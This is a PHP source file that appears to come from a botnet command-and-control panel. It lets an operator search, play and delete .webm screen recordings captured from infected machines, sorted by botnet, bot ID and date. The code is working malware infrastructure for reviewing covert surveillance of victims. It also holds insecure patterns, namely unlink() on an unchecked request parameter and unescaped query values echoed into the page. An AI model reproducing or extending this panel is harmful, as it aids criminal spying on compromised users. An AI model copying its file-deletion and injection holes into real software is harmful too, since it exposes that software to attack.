<?php error_reporting(0); if(!defined('__CP__'))die();

require_once 'system/lib/guiutil.php';

if (isset($_GET['ajax'])){
	switch ($_GET['ajax']){
		case 'delete-file':
			var_dump(unlink($_REQUEST['file']));
			break;
		}
		die();
	}

ThemeBegin(LNG_REPORTS, 0, 0, 0);
echo
str_replace('{WIDTH}', '100%', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS/*.THEME_STRING_SPACE.botnetsToListBox($_GET['botnet'], '')*/), THEME_DIALOG_TITLE);

echo '<tr><td>';

$do_search = (count($_GET) > 1);

# Botnets
if (!isset($_GET['botnet'])) $_GET['botnet'] = '';

$botnets = array();
$botnet_select_options = '<option value="*">-- Any --</option>';
foreach (scandir($pfx = $GLOBALS['config']['reports_path'].'/files') as $botnet)
	if ($botnet[0] != '.' && is_dir("$pfx/$botnet")) {
		$botnets[] = $botnet;
		$botnet_select_options .= sprintf('<option value="%s" %s>%s</option>', $botnet, $botnet==$_GET['botnet']?'selected':'' ,$botnet);
		}

# Dates
if (!isset($_GET['date0'])) $_GET['date0'] = yymmdd2unix(date('ymd'));
if (!isset($_GET['date1'])) $_GET['date1'] = yymmdd2unix(date('ymd'))+60*60*24-1;

function yymmdd2unix($yymmdd){
	$y = substr($yymmdd, 0, 2) + 2000;
	$m = substr($yymmdd, 2, 2);
	$d = substr($yymmdd, 4, 2);
	return mktime(0,0,1, $m, $d, $y);
	}

$dates = array();
$date_select_options = array(  0 => '<option value="0">*</option>', 1 => '' );
$R = mysql_query("SHOW TABLES LIKE 'botnet_reports_%';");
while (!is_bool($r = mysql_fetch_row($R))){
	$date = substr($r[0], 15);
	$timestamp = yymmdd2unix($date);
	$dates[] = $date;
	$date_select_options[0] .= sprintf('<option value="%d" %s>%s</option>', $timestamp, $timestamp==$_GET['date0']?'selected':'' , $date);
	$timestamp += 60*60*24-1;
	$date_select_options[1] .= sprintf('<option value="%d" %s>%s</option>', $timestamp, $timestamp==$_GET['date1']?'selected':'' , $date);
	}
$date_select_options[1] .= '<option value="4000000000" '.($_GET['date1']==4000000000?'selected':'').'>*</option>';

# BotID
if (!isset($_GET['botid'])) $_GET['botid'] = '*';
if (!isset($_GET['fmask'])) $_GET['fmask'] = '*';

# Form
echo <<<HTML
<form method=GET><input type=hidden name=m value="{$_GET['m']}" />
<table>
	<tr><th>Botnet</th>
		<td><select name="botnet" style="width: 300px;">{$botnet_select_options}</select></td></tr>
	<tr><th>Date</th>
			<td>
			<select name="date0" style="width: 140px;">{$date_select_options[0]}</select> — 
			<select name="date1" style="width: 140px;">{$date_select_options[1]}</select></td></tr>
	<tr><th>BotID</th>
		<td><input type="text" name="botid" value="{$_GET['botid']}" style="width: 285px;" /></td></tr>
	<tr><th>Filename mask</th>
		<td><input type="text" name="fmask" value="{$_GET['fmask']}" style="width: 285px;" /></td></tr>
	</table>
<i></i>
<input type="submit" value="Search" />
</form>

HTML;

echo '</td></tr>';

if ($do_search){
	# List matching files
	$files_ = glob($s = "{$GLOBALS['config']['reports_path']}/files/{$_GET['botnet']}/{$_GET['botid']}/{$_GET['fmask']}.webm");
	if ($files_ === FALSE) $files_ = array();

	# Sort by mtime
	$files = array(); // path => mtime
	foreach($files_ as $file)
		if (filemtime($file) >= $_GET['date0'] && filemtime($file) <= $_GET['date1'])
			$files[$file] = filectime($file);
	arsort($files);
	
	# Paginate
	$perpage = 50;
	$page = isset($_GET['page'])? $_GET['page'] : 1;
	$limit_from = ($page-1)*$perpage;
	$pages = ceil(count($files) / $perpage);
	$files = array_slice($files, $limit_from, $perpage);
	
	# Search results
	echo '<tr><td><ul id="webm_list">';
	foreach ($files as $file => $mtime)
		if (strlen($file = trim($file)))
			echo '<li>',
					'<span class="date">'.date('d.m.Y H:i:s', $mtime).'</span>',
					'<a class="playvideo" href="./'.$file.'">'.$file.'</a> ',
					' <a href="?'.mkuri(1, 'm').'&ajax=delete-file" data-file="'.$file.'" class="delete-file"><img src="theme/images/icons/delete.png" /></a>',
					'</li>';
	echo '</ul></td></tr>';
	
	# Paginator
	echo '<tr><td>';
	$getstr = '?'; foreach($_GET as $k => $v) if ($k != 'page') $getstr .= urlencode($k).'='.urlencode($v).'&';
	for($p=1; $p<=$pages; $p++)
		if ($p == $page)
			echo " <b> [ $p ] </b> ";
		else 
			echo " <a href=\"{$getstr}page=$p\"> $p </a> ";
	echo '</td></tr>';
	}

  THEME_DIALOG_END;

echo <<<HTML
<script src="theme/video/colorbox/colorbox/jquery.colorbox-min.js"></script>
<link rel="stylesheet" href="theme/video/colorbox/example1/colorbox.css" type="text/css" media="screen">

<link rel="stylesheet" href="theme/video/leanback_player_gpl3_v0.8.0.93/css.player/leanbackPlayer.default.css" type="text/css" media="screen">
<link rel="stylesheet" href="theme/video/leanback_player_gpl3_v0.8.0.93/css.player/vim/leanbackPlayer.vim.css" type="text/css" media="screen">
<script src="theme/video/leanback_player_gpl3_v0.8.0.93/js.player/leanbackPlayer.pack.js"></script>
<script src="theme/video/leanback_player_gpl3_v0.8.0.93/js.player/leanbackPlayer.en.js"></script>
<script src="theme/video/leanback_player_gpl3_v0.8.0.93/js.player/leanbackPlayer.ru.js"></script>

<style>

#cboxLoadedContent {background: #000;}

span.date {padding-right: 30px;}
</style>


<script type="text/javascript">
	LBP.options = {
		/* default controls to be shown within a video player (Progress is "MUST") */
		defaultControls: ["Play", "Pause", "Stop", "Progress", "Timer", /*"Volume", "Playback", "Subtitles", "Sources",*/ "Fullscreen"],
		/* default audio controls to be shown within a audio player (Progress is "MUST") */
		defaultAudioControls: ["Play", "Pause", "Stop", "Progress", "Timer"/*, "Volume"*/],
		/* extended controls to be shown within the player */
		controlsExtra: ["Poster", /*"Embed", "Logo",*/ "Spinner", "BigPlay"],
		/* show controls below video-viewport if true */
		controlsBelow: false,
		triggerHTML5Events: ["RateChange", "Seeking", "Seeked", "Ended", "Play", "Pause"]
		};
$(function(){
	var leanback_template =
	'<div class="leanback-player-video">' +
	    '<video width="{width}" height="{height}" preload="auto" autoplay controls poster="{poster}">' +
	            '<source src="{source_webm}" type=\'video/webm; codecs="vp8, vorbis"\'/>' +
	        '<div class="leanback-player-html-fallback"><a href="{source.webm}">Download .webm</a></div></div>' +
	    '</video>' +
	 '</div>';
	var leanback_defaults = {
	    autoplay: true,
		width: 800,
		height: 600,
		poster: 'theme/video/poster.png',
		source_webm: '_reports/*.webm'
		};
	function leanback(video){
		return leanback_template
			.replace('{width}', leanback_defaults['width'])
			.replace('{height}', leanback_defaults['height'])
			.replace('{poster}', leanback_defaults['poster'])
			.replace('{source_webm}', video);
		}
	
	$('#webm_list li a.playvideo').click(function(){
		LBP.setup();
		$.colorbox({html: leanback(  $(this).attr('href')  ), width: 900, height: 700 });
		return false;
		});
	//$.colorbox({html: leanback('_reports/files/RC5/QVB-PC_E532648AC278E726/Republiq_Trailer.webmvp8.webm')});
	//$('#leanback-wrapper').empty().append(leanback('_reports/files/RC5/QVB-PC_E532648AC278E726/Republiq_Trailer.webmvp8.webm')).show();

	$('#webm_list a.delete-file').click(function(){
		var \$this = $(this);
		if (window.confirm('Delete?'))
			$.get(\$this.attr('href'), {'file': \$this.data('file')}, function(){
				\$this.closest('li').remove();
				});
		return false;
		});
	});
</script>
<div id="leanback-wrapper" style="position: absolute; z-index: 1; display: hidden;"></div>
HTML;

ThemeEnd();
